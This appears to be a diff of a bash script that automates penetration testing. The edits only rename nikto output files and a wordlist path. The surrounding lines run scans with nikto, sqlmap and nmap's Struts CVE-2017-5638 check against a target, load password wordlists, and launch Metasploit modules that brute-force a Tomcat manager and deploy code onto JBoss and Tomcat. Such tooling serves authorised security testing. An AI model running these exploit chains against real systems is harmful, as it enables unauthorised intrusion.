@@ -29,7 +29,7 @@ DNS_FILE="/usr/share/brutex/wordlists/namelist.txt"
 UDP_PORTS="53,67,68,69,88,123,161,162,137,138,139,389,520,2049"
 SAMRDUMP="/media/sf_KaliSharedFolder/tools/autoscan/tools/samrdump.py"
 WORKSPACE=$CustomerName
-USER_FILE="/usr/share/wordlists/unix_users.txt"
+USER_FILE="/usr/share/wordlists/metasploit/unix_users.txt"
 PASS_FILE="/usr/share/wordlists/rockyou.txt"
 LHOST=$(ifconfig  eth0 | grep -w inet | awk {'print $2'})
 SRVHOST=$LHOST
@@ -472,7 +472,7 @@ echo -e "$RED PORT 80 open, running Test"
     echo -e "${GREEN}===========================================================================${RESET}"
     echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
     echo -e "${GREEN}===========================================================================${RESET}"
-    nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.$port_80.xml 
+    nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.80.xml 
     echo -e "${GREEN}===========================================================================${RESET}"
     echo -e "$RED RUNNING SQLMAP SCAN ${RESET}"
     echo -e "${GREEN}===========================================================================${RESET}"
@@ -574,7 +574,7 @@ if [ -z "$port_88" ];
     echo -e "${GREEN}===========================================================================${RESET}"
     echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
     echo -e "${GREEN}===========================================================================${RESET}"
-    nikto -h http://$TARGET:88 -Format xml -o $LOG_DIR/$TARGET.nikto.port_88.xml  
+    nikto -h http://$TARGET:88 -Format xml -o $LOG_DIR/$TARGET.nikto.88.xml  
     echo -e "${GREEN}===========================================================================${RESET}"
     echo -e "$RED RUNNING SQLMAP SCAN ${RESET}"
     echo -e "${GREEN}===========================================================================${RESET}"
@@ -813,7 +813,7 @@ else
   echo -e "${GREEN}====================================================================================${RESET}"
   echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
   echo -e "${GREEN}====================================================================================${RESET}"
-  nikto -h https://$TARGET -Format xml -o $LOG_DIR/$TARGET.nikto_.port_443.xml    
+  nikto -h https://$TARGET -Format xml -o $LOG_DIR/$TARGET.nikto_.443.xml    
   #arachni --report-save-path=$LOG_DIR/ --output-only-positives --checks=active/* https://$TARGET  > test.arachni.log  
   #arachni_reporter $LOG_DIR/*.afr --report=xml:outfile=$LOG_DIR/$TARGET-http_443.xml  
   #cat $LOG_DIR/$TARGET-http_443.xml |grep -v Arachni | grep -v Author | grep -v Website | grep -v Documentation  
@@ -993,7 +993,7 @@ else
   python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 4443 
   sslscan --no-failed $TARGET:4443
   python $TOOL_DIR/sslcheck.py  --xml $LOG_DIR/$TARGET.sslcheck_4443.xml $TARGET -port 4443
-  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.$port_4443.xml
+  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.4443.xml
   #cutycapt --url=https://$TARGET:4443 --out=$LOG_DIR/$TARGET-port4443.jpg 2> /dev/null
   nmap -sV -Pn -A -p 4443  --script=*proxy* $TARGET -oX $LOG_DIR/$TARGET.nmap4443.xml 
   #echo -e "$RED[+]${RESET} Screenshot saved to $LOG_DIR/$TARGET-port443.jpg"
@@ -1066,7 +1066,7 @@ else
   whatweb http://$TARGET:8000
   echo ""
   python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 8000
-  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.$port_8000.xml
+  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.8000.xml
   nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8000  $TARGET -oX $LOG_DIR/$TARGET.nmap_8000.xml
   echo -e "${GREEN}====================================================================================${RESET}"
   echo -e "$RED RUNNING JEXBOSS ${RESET}"
@@ -1085,7 +1085,7 @@ else
   echo ""
   python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 8100
   sslscan --no-failed $TARGET:8100
-  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.$port_8100.xml
+  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.8100.xml
   cutycapt --url=http://$TARGET:8100 --out=$LOG_DIR/$TARGET-port8100.jpg 2> /dev/null
   nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8100 $TARGET -oX $LOG_DIR/$TARGET.nmap_8100.xml   
   echo -e "${GREEN}====================================================================================${RESET}"
@@ -1105,7 +1105,7 @@ else
   echo ""
   python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 8080
   sslscan --no-failed $TARGET:8080
-  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.$port_8080.xml
+  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.8080.xml
   cutycapt --url=http://$TARGET:8080 --out=$LOG_DIR/$TARGET-port8080.jpg 2> /dev/null
   nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8080  --script=*proxy* $TARGET -oX $LOG_DIR/$TARGET.nmap_8080.xml   
   msfconsole -x "use admin/http/jboss_bshdeployer; setg RHOST "$TARGET"; run; use admin/http/tomcat_administration;setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum;run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"  
@@ -1129,7 +1129,7 @@ else
   python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 8180
   sslscan --no-failed $TARGET:8180
   python $TOOL_DIR/sslcheck.py --xml $LOG_DIR/$TARGET.sslcheck_8180.xml $TARGET -port 8180
-  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.$port_8180.xml
+  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.8180.xml
   cutycapt --url=http://$TARGET:8180 --out=$LOG_DIR/$TARGET-port8180.jpg  
   nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180  --script=*proxy* $TARGET -oX $LOG_DIR/$TARGET.nmap_8180.xml   
   echo -e "${GREEN}====================================================================================${RESET}"
@@ -1158,7 +1158,7 @@ else
   python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 8443
   sslscan --no-failed $TARGET:8443
   python $TOOL_DIR/sslcheck.py  --xml $LOG_DIR/$TARGET.sslcheck_8443.xml $TARGET -port 8443
-  nikto -h https://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.$port_8443.xml
+  nikto -h https://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.8443.xml
   cutycapt --url=https://$TARGET:8443 --out=$LOG_DIR/$TARGET-port8443.jpg  
   nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8443  --script=*proxy* $TARGET -oX $LOG_DIR/$TARGET.nmap_8443.xml   
   echo -e "${GREEN}====================================================================================${RESET}"
@@ -1177,7 +1177,7 @@ else
   whatweb http://$TARGET:8888
   echo ""
   python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 8888
-  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.$port_8888.xml
+  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.8888.xml
   cutycapt --url=https://$TARGET:8888 --out=$LOG_DIR/$TARGET-port8888.jpg 2> /dev/null
   nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8888  $TARGET -oX $LOG_DIR/$TARGET.nmap_8888.xml   
   echo -e "${GREEN}====================================================================================${RESET}"
